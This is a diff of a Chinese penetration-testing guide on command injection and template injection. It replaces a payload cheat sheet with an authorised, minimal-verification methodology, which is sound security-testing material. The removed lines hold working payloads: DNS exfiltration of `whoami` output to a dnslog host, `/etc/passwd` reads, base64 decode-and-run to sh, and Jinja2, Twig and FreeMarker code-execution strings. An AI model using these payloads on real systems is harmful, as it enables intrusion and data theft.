@@ -1,29 +1,37 @@
-# 命令注入与 RCE
+# 系统命令与参数注入
 
-## 触发点
-- ping/nslookup 类工具调用、文件处理（ffmpeg/imagemagick）、导出功能（拼系统命令）
-- 模板注入 SSTI：Jinja2/Twig/FreeMarker/Velocity 用户输入进模板
-- 表达式注入：EL/OGNL（Struts2）、SpEL（Spring）、JEXL
-- 反序列化触发（详见 deserialization-rce.md）
+## 适用信号与前提
 
-## 命令注入 Payload
-- 拼接符：`;` `|` `||` `&&` `` ` `` `$()` 换行 `%0a`
-- 无回显盲注：时间延迟 `sleep 5`、DNS 带外 `ping $(whoami).dnslog.cn`、写文件到可访问目录
-- 过滤绕过：空格 `$IFS`、`${IFS}`、`{a,b}` 花括号、`cat</etc/passwd`
-- 编码：base64 `echo base64|base64 -d|sh`、hex、变量拼接 `c''at`
-- 参数注入：`--help`/`--output=` 覆盖文件、`--upload-file` 利用 curl/wget 参数
+网络诊断、文件转换、导出和系统工具参数。先观察正常功能、输入到执行器的数据流和组件版本。模板渲染与表达式入口读取 [SSTI](ssti.md)。
 
-## SSTI 快速验证
-- 探测：`{{7*7}}` 返回 49
-- Jinja2：`{{config}}`、`{{''.__class__.__mro__[1].__subclasses__()}}`
-- Twig：`{{_self.env.registerUndefinedFilterCallback('system')}}`
-- FreeMarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
-- 识别引擎：`{{7*7}}`/`${7*7}` 响应差异
+## 最小实验
 
-## 最小化验证
-- 用 `id`/`whoami`/`pwd` 类只读命令证明执行，不写文件不弹 shell
-- 带外验证用自建 dnslog 域名
-- 绝不反弹 shell 到公网、不横向移动
+针对确认的上下文使用非敏感、无副作用的常量/随机标记结果，先排除输入回显。
 
-## 报告要点
-- 触发点 + payload + 回显/带外证据、执行身份、可写目录范围（仅证明可达）
+只在命令执行验证动作获准时使用短只读身份/常量输出，或获准受控接收端上的唯一标记；不把系统输出编码进外部请求。命令注入、参数注入、模板求值与任意代码执行分别记录能力。
+
+无回显时优先读取已有日志/关联证据；时间验证需匹配明确许可与预算，不写文件或修改配置来获得回显。
+
+## 确认与反例
+
+服务端实际解释了不应执行的输入，结果与特定实验可归因。算术结果不等于任意系统命令；DNS 回连不单独证明 RCE；看到命令字符串不等于执行。
+
+排除正常内置计算器、前端表达式、错误消息反射、网关预取与异步噪声。能力升级需要新的证据，不能从一个引擎特征推断所有 gadget 可用。
+
+## 下一步、停止与报告
+
+不写文件、不弹 shell、不驻留、不横向移动、不读取应用配置或凭据来放大影响。已有最小执行证据即停止该验证。保留执行上下文、身份（可证明时）、模板/组件条件和原始结果；遵守 [验证](../verification.md)。
+
+## 调研补充：可执行检查点
+
+- 区分 shell 语法注入与工具自身参数注入：shell 转义通过并不保证工具选项无风险；先从调用点和正常参数确认执行模型。
+- 以最小可归因的常量输出作验证，排除输入回显；盲测需要独立带外归因或有许可的短时间对照。不能看到一次 DNS 就直接写 RCE。
+- OS、shell、工具版本不同，解析规则也不同；先在本地复现语义，不调用未知反射方法，不遍历危险方法表。
+- 模板计算单独读 [SSTI](ssti.md)，不要因渲染了一个算术值就宣布系统命令执行。
+
+## 调研来源
+
+- [PS-cmd · OS command injection](https://portswigger.net/web-security/os-command-injection)
+- [PMNH-waf · RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass](https://www.pmnh.site/post/writeup_spring_el_waf_bypass/)
+
+资料核对日期：2026-09-14。来源的证据层级与历史日期见 [来源登记](../research/sources.json)；实验安排是本 skill 的综合设计，不表示已在当前目标复现。
